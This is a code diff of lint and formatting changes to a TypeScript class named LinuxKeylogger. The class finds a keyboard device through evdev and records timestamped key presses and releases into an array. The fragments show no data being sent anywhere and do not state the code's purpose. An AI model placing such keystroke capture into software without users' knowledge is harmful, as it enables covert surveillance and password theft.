@@ -21,7 +21,7 @@ interface Evdev {
   KEY: { [key: number]: string };
 }
 
-// eslint-disable-next-line @typescript-eslint/no-var-requires, @typescript-eslint/no-require-imports
+// eslint-disable-next-line @typescript-eslint/no-require-imports
 const evdev = require('evdev') as Evdev;
 
 const EV_KEY = evdev.EV_KEY;
@@ -46,7 +46,9 @@ class LinuxKeylogger {
   async start() {
     // Find keyboard device
     const devices = evdev.list();
-    this.device = devices.find((dev: EvdevDevice) => dev.name.toLowerCase().includes('keyboard'));
+    this.device = devices.find((dev: EvdevDevice) =>
+      dev.name.toLowerCase().includes('keyboard')
+    );
     if (!this.device) {
       throw new Error('No keyboard device found');
     }
@@ -60,12 +62,17 @@ class LinuxKeylogger {
       if (event.type === EV_KEY) {
         const keyName = KEY[event.code];
         if (keyName) {
-          const type: 'press' | 'release' = event.value === 1 ? 'press' : event.value === 0 ? 'release' : 'press'; // 1 press, 0 release, 2 repeat
+          const type: 'press' | 'release' =
+            event.value === 1
+              ? 'press'
+              : event.value === 0
+                ? 'release'
+                : 'press'; // 1 press, 0 release, 2 repeat
           if (type === 'press' || type === 'release') {
             this.keystrokes.push({
               key: keyName.toLowerCase(), // normalize to lowercase
               timestamp: Date.now(),
-              type
+              type,
             });
           }
         }
